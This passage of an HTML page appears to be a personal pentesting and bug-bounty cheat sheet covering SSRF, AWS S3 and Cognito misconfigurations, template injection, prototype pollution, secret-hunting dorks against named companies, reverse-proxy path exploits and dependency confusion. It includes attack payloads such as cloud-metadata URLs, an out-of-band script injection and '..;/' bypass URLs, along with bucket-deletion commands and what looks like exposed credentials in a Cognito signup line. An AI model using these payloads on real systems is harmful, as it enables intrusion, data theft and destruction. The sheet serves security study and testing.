          <li>SSRF to LFI use <code>file:///, dict:///, sftp:/// , ldap ;/// , ldaps:/// , ldapi:/// , tftp:///</code></li>
              <li>SSRF to internal port scan</li>
            <li>SSRF if any application converting file type  pdf to image or html</li>
                <li>SSRF to retrive cloud metadata if application using cloud
          <ul>
                <li>for amazone <code> http://169.254.169.254/latest/metadata</code></li>
             <li>for Google <code> http://metadata.google.internal/computeMetadata/v1</code></li>
            <li>Azure <code>http://169.254.169.254/metadata</code></li>
        </ul>
    </li>
        </ul>

        <h3 id="aws-pentesting">AWS pentesting</h3>
 <p>You can also use s3scanner tool</p>
  <ul>
        <li>aws set to list for everyone</li>
            <p><code>aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2</code></p>
       <li>aws list for any aws user</li>
            <p><code>aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></p>
        <li>Download this whole S3 bucket using</li>
        <p><code>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2</code></p>
        <li>Delete Bucket</li>
        <p> <code>aws s3 rb s3://my-awesome-new-bucket --force</code></p>
       <li>Download S3 Object to Local</li>
       <p><code>aws s3 cp s3://my-awesome-new-bucket .</code></p>
           <p>download: ./backup.tar from s3://my-awesome-new-bucket/backup.tar</p>
     <li>Upload Local File as S3 Object</li>
     <p><code>aws s3 cp backup.tar s3://my-awesome-new-bucket</code></p>
       <p> upload: ./backup.tar to s3://my-awesome-new-bucket/backup.tar</p>

     <li>Delete S3 Object</li>
            <p><code>aws s3 rm s3://my-awesome-new-bucket/secret-file.gz</code></p>
        <p>delete: s3://my-awesome-new-bucket/secret-file.gz</p>
  </ul>
   <p>For ACL testing you can use following command:: <code>aws s3api get-bucket-acl --bucket bucket-name --no-sign-request</code></p>
   <h3 id="aws-cognito">AWS Cognito Misconfiguration</h3>
   <p><a href="https://www.youtube.com/watch?v=TuiDJ5Ii6MU">https://www.youtube.com/watch?v=TuiDJ5Ii6MU</a></p>

 <p>aws congnito , you can add user signup and signin feature and control access to your web and mobile applications .</p>
     <p>amazone cognito provides a identiry store that scales to millions of user supports social and enterprize ferdaration.</p>

     <h4 id="aws-intro">Intro to aws cognito</h4>
        <ul>
            <li>User Pools : allows sign-in and signup functionality</li>
            <li>Identity Pools : allows authenticated and unauthenticated users to access aws resources using temporary aws credetials..</li>
         </ul>

        <h4 id="security-misconfig1">Security misconfiguration 1</h4>
        <p>Unauthrized access to aws services due to liberal aws credentials</p>
       <p>Try to fetch aws credentials as unauthenticated user</p>
    <p>To generate the aws credentials , we need to find Identiy Pool Id which mostly hardcoded in source code in bundle js or HTTP respoce , other usefull info you can find
        :</p>
     <ul>
          <li>client id</li>
            <li>user pool id</li>
           <li>region</li>
      </ul>
      <p>Command $: <code>aws cognito-identity get-id --identity-pool-id <identity-pool-id> --region <region></code></p>
       <p>above commnad give identity-id </p>
      <p><code>$: aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --region <region></code></p>

       <h4 id="security-misconfig2">Security misconfiguration 2</h4>
       <p>Authentication bypass due to signup API action</p>
        <p>Applicatin not offering user signup only supporting administrative provision of accounts could be vulnerable due to not disabling signup API action</p>
        <p>Try to signup with following command :</p>
        <p><code>$: aws cognito-idp signup --cliet-id 4aa41hr4s2apkli7ivikgf1afg --username ranveer2354@gmail.com --password 8890@#%$devD --region us-east-1</code></p>
    <h4 id="security-misconfig3">Security misconfiguration 3</h4>
    <p>Priviledge escalatin through writable user attributes</p>
     <p>Fetch user attribute after login account :</p>
        <p><code>$:aws cognito-idp get-uer --region <region> --access-token <token></code></p>
       <p>Updating user attributes</p>
   <p><code>$:aws cognito-idp update-user-attributes --region <region> --access-token <token> --update-attributes Name=<name> ,value=<value></code></p>

   <h4 id="security-misconfig4">Security misconfiguration 4</h4>
       <p>Updating email attributes before the verifivation </p>
        <p>Even with email verfication enabled, most application update the email attribute to new unverfied email address. From this user can login with new email without verified .</p>
    <hr/>

    <h3 id="soap-vuln">SOAP</h3>
        <p> if we found ?wsdl file then we can use SOAP UI tool in windows</p>

    <h3 id="xpath-injection">XPATH injection</h3>
        <p>check for single and double quote and find always true statement and always false statement</p>
    <h3 id="serialization-vuln">Serialization vulnerability</h3>
       <ul>
         <li>java serialization</li>
          <li>Php serialization</li>
         <li>.Net serialization</li>
       </ul>
     <h3 id="template-injection">Template Injection</h3>
        <ul>
            <li>{{7*7}}</li>
              <li>${7*7}</li>
              <li>%{7*7}</li>
             <li>#{7*7}</li>
            <li>%{7*7}</li>
               <li>{7*7}</li>
             <li>${{48*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt></li>
     </ul>
  <h3 id="xslt-vuln">XSLT</h3>
    <p>it is like xml document</p>
    <ul>
         <li>XSLT to file read</li>
       <li>XSLt to rce</li>
    </ul>
     <h3 id="padding-oracle">Padding Oracle attack</h3>
       <h3 id="hash-length-extension">Hash Lenght Extension attack</h3>
  <h3 id="prototype-pollution">Prototype pollution</h3>
     <p>Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.
         An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.</p>
       <p><a href="https://www.youtube.com/watch?v=Gv1nK6Wj8qM">https://www.youtube.com/watch?v=Gv1nK6Wj8qM</a> nahamsec video for prototype</p>
        <p><a href="https://www.youtube.com/watch?v=J3MIOIqvV8w">https://www.youtube.com/watch?v=J3MIOIqvV8w</a> good video for revison</p>
       <p><a href="https://www.youtube.com/watch?v=yDmOXhr8wmw">https://www.youtube.com/watch?v=yDmOXhr8wmw</a></p>
 <pre><code>
>> a={}
Object {  }
>> b={}
Object {  }
>> b.__proto__.foo='bar';
"bar"
>> b.foo
"bar"
>> c={}
Object {  }
>> c.foo
"bar"
>> a.foo
"bar"
       </code></pre>

      <h3 id="github-data-exposure">Git hub sensetive data exposes</h3>
     <p>Use truflehog tool</p>
     <p>Go to site <a href="https://github.com/random-robbie/keywords/blob/master/keywords.txt">https://github.com/random-robbie/keywords/blob/master/keywords.txt</a></p>
        <ul>
             <li>"company" security_credentials Ldap</li>
            <li>"company" connectionstring Database creds</li>
            <li>"company" JDBC database creds</li>
            <li>"company" ssh2_auth_password Authbyapss</li>
           <li>"company" send_keys or send, keys other keywords</li>
           <li> "company" langauge:python keys</li>
           <li>"fasken.com" pasword NOT iaa.hasken.com</li>
            <li>org:fasken pasword</li>
            <li>user:ranveer paswd</li>
        </ul>
        <h3 id="google-dorking">Google Dorking</h3>
        <ul>
            <li><code>site:help.financialforce.com ext:htm</code> Shows the extension in html from gooogle</li>
              <li><code> site:help.financialforce.com ext:xlsx</code></li>
             <li><code> site:help.financialforce.com ext:pdf intitle:Setup</code></li>
            <li><code> site:help.financialforce.com ext:php intitle:Setup</code></li>
             <li><code> site:help.financialforce.com ext:jsp</code></li>
        </ul>
          <p><code>site:.nab.com.au intitle:"</code></p>
          <p><code>site:.financialforce.com inurl:img_url</code> Shows url for ssrf</p>
          <p><code>site:.financialforce.com inurl:*/admin/*</code> Shows the admin pages</p>
            <p><code>site:.financialforce.com inurl:*/api?*</code></p>
            <p><code>site:*.dell.com -www</code> Remove the www subdomains from the output</p>
            <p><code>site:"target[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess</code></p>

        <h3 id="reverse-proxies">Reverse Proxies</h3>
        <ol>
            <li>Path parameters in java based servers</li>
         </ol>
            <p>Similar to query strings (?a=1&b=2) but delimmited by ";"</p>
            <p>Example: <code>"/index.jsp;x=1;y=2"</code> Consist of path parameter x and y</p>
            <p>Having extraneous ";" also wonot affect loading the file</p>
            <p>Example: <code>"/index.jsp;"</code> would return <code>"/index.jsp"</code> content</p>

          <ol>
             <li>Path parameters in Tomacat</li>
        </ol>
        <p>Tomacat parses the path in the following manner</p>
      <ul>
           <li>Remove path parameters -begining from ";" until position of "/"</li>
       </ul>

       <p>Example: <code>"/xyz;test=1/index.jsp"</code> would become <code>"/xyz/index.jsp"</code></p>
         <p> <code>"/xyz;/index.jsp"</code> would become <code>"/xyz/index.jsp"</code></p>
         <ul>
             <li>Url decode the path</li>
            <li>Normalise the path ( basically resolve <code>/../</code> or multiple <code>///</code> etc.)</li>
       </ul>

    <ol>
     <li>Nginx as a Reverse Proxy</li>
    </ol>
       <p>Example Rule1.</p>

      <pre><code>
nginx.conf:
server{
  location /app1{
       proxy_pass http://internal.app;
           }
    }
      </code></pre>

  <p>Any HTTP request to Nginx server with path <code>/app1<anything here></code> would be proxied to <code>http://interanl .app/<anthing here></code></p>
      <p>Example Rule2.</p>
    <pre><code>
nginx.conf;
server {
   location ~ ^/app2/(.*\.jpg)${ #Matches any fileending with .jpg in /app2/ directory
        proxy_pass http://internal.app/app2/$1;
        }
    }
      </code></pre>
         <p>Any HTTP request to nginx server with path <code>/app2/<anything>.jpg</code> would be proxied to
                <code>http://interanl.app/app2/<anything>.jpg</code></p>

        <p>Processing done by nginx :</p>
        <ul>
              <li>Url decode once & normalize the path eg. <code>/../</code> , <code>%2f..%2f</code> etc (<code>/..</code> is not normalize) before
                matching the location rule</li>
         <li>Ignore <code>"#"</code> URI fragment part</li>
         <li>doesnot allow <code>%2f</code> as the first slash and <code>////</code>(multiple slash) become <code>/</code></li>
        <li>if root trailing <code>'/'</code> is missing in proxy_pass argument, unprocessed raw path is send as a is</li>
        </ul>

    <h3 id="reverse-proxy-nginx-tomcat">First senorio where nginx is reverse proxy and tomcat is backend server</h3>
      <ul>
           <li>suppose there exists an unauth internal API/path/file or say Tomcat manager is with default creds</li>
            <li>Remember the <code>http://internal.app:8080</code> services is not exposed externally</li>
           <li><code>http://site.com/app/../</code> would be processed ny nginx to <code>'/'</code> and look for the rule <code>'/'</code> instead of <code>"/app"</code>
             </li>
           <li>Therefore , <code>/../</code> of <code>%2f..%2f</code> or similar variation won't work</li>
          </ul>
    <p>Exploit for this is <code>http://site.com/app/..;/secretapi/users</code></p>
   <p><code>http://site.com/app../secretapi/users</code></p>
   <p> <code> http://site.com/static../setting.py</code> we can load file witch have creds</p>
  <p><code>http://site.com/protcted//../</code></p>
 <p><code>https://www.example.com..;/api/v1/users</code></p>
       <p><code>https://www.example.com/api..;/v1/users</code></p>
         <p><code>https://www.example.com/api/v1..;/users</code></p>
          <p><code>https://www.example.com/..;api/v1/users</code></p>
          <p><code>https://www.example.com/api/..;v1/users</code></p>
         <p><code>https://www.example.com/api/v1/..;users</code></p>
         <p><code>https://www.example.com/api/v1/users/..;</code></p>
         <p><code>https://www.example.com/api/v1/users/..;/</code></p>

  <h3 id="reverse-proxy-apache">Apache as a reverse proxy</h3>
        <p>Processing done by apache :</p>
     <ul>
           <li>Url decodes once & mormalize the path before matching location rule</li>
     </ul>
   <ul>
      <li><code>////</code>(multiple slash) becomes <code>/</code> if it is in the begining eg <code>///path=> /path</code></li>
       <li>afterwards , <code>/path//path2</code> apache treats <code>//</code> as an individual directory with blank name
         </li>
     <li>send processd request</li>
  </ul>
         <p>Exploit: Any request to apache server with path <code>/img/@evil.com/</code> or <code>/img/.evil.com/</code>
          would now allow make a arbitrary server side request to <code>evil.com</code> via proxy .</p>

    <h3 id="dependency-confusion">Dependency Confusion</h3>
        <p>1. In Web application if we found <code>package.json</code> or <code>packeg-lock.json</code> then we test for dependency confusion</p>
        <p>2. Then we test for public and private npm library</p>
        <p>3. Dependency confusion happen only on private library and check on <a href="https://registry.npmjs.org/underscore">https://registry.npmjs.org/underscore</a> like underscore is available we cannot takeover</p>
    <p>4. We can create own public librarry</p>
        <p>4. What happens if malicious code is uploaded to npm under these names? Is it possible that some of web app will start defaulting to the new public packages instead of the private ones?</p>
          <p>Oneliner for dependency confusion check</p>
        <pre><code>
find . -type f -name package.json | xargs -n1 -I{} cat {} | jq -r '.dependencies + .devDependencies' | cut -d : -f 1 | tr -d '"|}|{' | sort -u | tr -s " " | sort -u | xargs -n1 -I{} echo "https://registry.npmjs.org/{}" | grep -v "@" | httpx -status-code -silent -content-length -mc 404
     </code></pre>

    </div>

<script>
    const sidebarList = document.getElementById('sidebar-list');
    const content = document.getElementById('content');

    const headings = content.querySelectorAll('h1, h2, h3');


    headings.forEach(heading => {
       if(heading.id){
           const listItem = document.createElement('li');
           const link = document.createElement('a');
            link.href = '#' + heading.id;
           link.textContent = heading.textContent;
         listItem.appendChild(link);
         sidebarList.appendChild(listItem);
       }
    });


    headings.forEach(heading => {
       if(heading.id){
            heading.addEventListener('click', (e) => {
            e.preventDefault();
            const element = document.getElementById(heading.id);
              if (element) {
                 element.scrollIntoView({ behavior: 'smooth' });
                }
              });
           }
    });

</script>

</body>
</html>
